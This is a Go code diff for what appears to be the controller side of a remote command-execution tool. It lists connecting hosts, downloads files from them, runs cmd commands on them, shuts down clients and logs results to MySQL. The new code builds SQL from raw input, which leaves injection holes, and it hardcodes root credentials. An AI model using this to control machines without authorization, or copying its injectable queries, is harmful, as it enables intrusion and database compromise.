@@ -23,8 +23,8 @@ import (
 var listener net.Listener
 var db *sql.DB //声明一个全局的db变量
 var conn net.Conn
-var  wg sync.WaitGroup //声明一个计时器
-
+var  wg sync.WaitGroup
+var informant =make(map[int]string)
 // InitMysql 初始化数据库和尝试连接数据库
 func InitMysql() (err error) {
 	innodb := "root:root@tcp(127.0.0.1:3306)/select_information"
@@ -39,22 +39,63 @@ func InitMysql() (err error) {
 	return
 }
 
-// InsertNewDemo 在数据库中对数据库执行增删查改的操作
+// InsertNewDemo 在数据库中对数据库执行添加，删除，修改数据的功能
 func InsertNewDemo() {
 	for {
-
-		fmt.Print("请输入sql语句！\n")
+		fmt.Print("请选择insert or delete or update:")
+		instructed := bufio.NewReader(os.Stdin)
+		n, _ := instructed.ReadString('\n')
+		instructs := strings.Trim(n, "\r\n")
+		if instructs=="insert" {
+			_, err := db.Exec("INSERT INTO result(host_ip,information1,information2,information3)" + "values ('" + informant[1] + "','" + informant[2] + "','" + informant[3] + "','" + informant[4] + "')")
+			if err != nil {
+				fmt.Print("insert information err:", err)
+			} else {
+				fmt.Print("insert information success!\n")
+			}
+		}else if instructs=="delete" {
+			fmt.Print("请输入要删除的行的host_ip:")
+			function:= bufio.NewReader(os.Stdin)
+			j,_:=function.ReadString('\n')
+			functor :=strings.Trim(j,"\r\n")
+			_,err1:=db.Exec("DELETE FROM result where host_ip="+"'"+ functor +"'")
+			if  err1!= nil {
+				fmt.Print("delete information err:",err1,"\n")
+			}else {
+				fmt.Print("delete success!")
+			}
+		}else if instructs=="update" {
+			fmt.Print("请输入需要修改数据的host_ip:")
+			update:= bufio.NewReader(os.Stdin)
+			l,_:=update.ReadString('\n')
+			updates :=strings.Trim(l,"\r\n")
+			fmt.Print("请输入需要修改的数据所在的列：","\n")
+			column:= bufio.NewReader(os.Stdin)
+			k,_:=column.ReadString('\n')
+			columns:=strings.Trim(k,"\r\n")
+			fmt.Print("请输入修改后的数据：","\n")
+			AfterInformation := bufio.NewReader(os.Stdin)
+			a,_:=AfterInformation.ReadString('\n')
+			After:=strings.Trim(a,"\r\n")
+			_,err2:=db.Exec("UPDATE result SET " + "`" + columns + "` = " + " '" + After + "' WHERE host_ip = " + "'"+ updates +"'")
+			if err2 != nil {
+				fmt.Print("update information err:",err2)
+			}else {
+				fmt.Print("update success!\n")
+			}
+		}else {
+			fmt.Print("请重新选择操作！\n")
+		}
+		fmt.Print("是否返回cmd命令?(yes or no)")
 		instruction := bufio.NewReader(os.Stdin)
 		m, _ := instruction.ReadString('\n')
-		instruct := strings.Trim(m, "\n")
-		if strings.Compare(instruct, "z") == 1 {
+		instruct := strings.Trim(m, "\r\n")
+		if instruct=="yes" {
+			//清空字典
+			delete(informant,2)
+			delete(informant,3)
+			delete(informant,4)
 			return
-		}
-		_, err := db.Exec(instruct)
-		if err != nil {
-			fmt.Print("insert information err:", err)
-		} else {
-			fmt.Print("insert information success!\n")
 		}
 	}
 }
@@ -80,6 +121,8 @@ func listeners() {
 		conn, _ = listener.Accept() //没有收到连接请求就一直堵塞
 		fmt.Println("叮，您有新的主机上线啦！")
 		fmt.Print("主机ip为：", conn.RemoteAddr(), "\n")
+		informant[1]=conn.RemoteAddr().String()
+		fmt.Print("ip存储成功！","\n")
 		fmt.Print("开始通信的时间为：", time.Now().Format("2006-01-02 15:04:05"))
 		fmt.Print("\n")
 		go selection() //接收数据返回接受无误 进入下一个函数选择需要做的操作
@@ -95,8 +138,9 @@ func selection() {
 		//upfile从远程主机下载文件
 		fmt.Print("upfile,从远程主机下载文件；\n")
 		//cmd执行cmd命令
-		fmt.Print("cmd,执行其他命令；\n")
+		fmt.Print("cmd,执行cmd命令；\n")
 		fmt.Print("heartbeat,开启心跳功能；\n")
+		fmt.Print("shutdown,关闭client程序；\n")
 		fmt.Print("quit,退出连接！\n")
 		fmt.Println("请输入要执行的操作：")
 		input := bufio.NewReader(os.Stdin)
@@ -112,18 +156,27 @@ func selection() {
 			_, _ = conn.Write([]byte(s))
 			process()
 		} else if s == "quit" {
-			_, _ = conn.Write([]byte(s))
-			_ = conn.Close()
-			return
+			//删除ip
+			delete(informant,1)
+			//向客户端发送断开连接的消息
+			buf:=make([]byte,4096)
+			_,_=conn.Write([]byte(s))
+			n,_:=conn.Read(buf)
+			fmt.Print(string(buf[:n]),"\n")
+			i:=string(buf[:n])
+			i=strings.Trim(i,"\r\n")
+			if i=="ok" {
+				fmt.Print("关闭客户端程序成功！","\n")
+				wg.Done()
+				runtime.Goexit()
+			}
 		} else if s == "heartbeat" {
 			go keepAlive()
 			fmt.Print("心跳功能开启成功！\n")
 			wg.Wait()
 			_=conn.Close()
-			wg.Add(1)
-			wg.Done()
 			runtime.Goexit()
-		} else {
+		}else {
 			fmt.Print("请重新输入需要执行的操作！\n")
 		}
 
@@ -132,6 +185,7 @@ func selection() {
 
 //从客户端读取执行cmd命令返回的结果
 func process() {
+	i:=2
 	//连接数据库
 	err := InitMysql()
 	if err != nil {
@@ -172,7 +226,14 @@ func process() {
 			fmt.Print("(yes or no err):", err4)
 		}
 		if finally == "yes" {
-			InsertNewDemo()
+			informant[i]=rec
+			fmt.Print("数据已经存入字典啦，还差",4-i,"条数据就可以存进数据库啦！","\n")
+			if i==4 {
+				fmt.Print("将数据插入数据库！","\n")
+				i=1
+				InsertNewDemo()
+			}
+			i++
 		}
 	}
 }
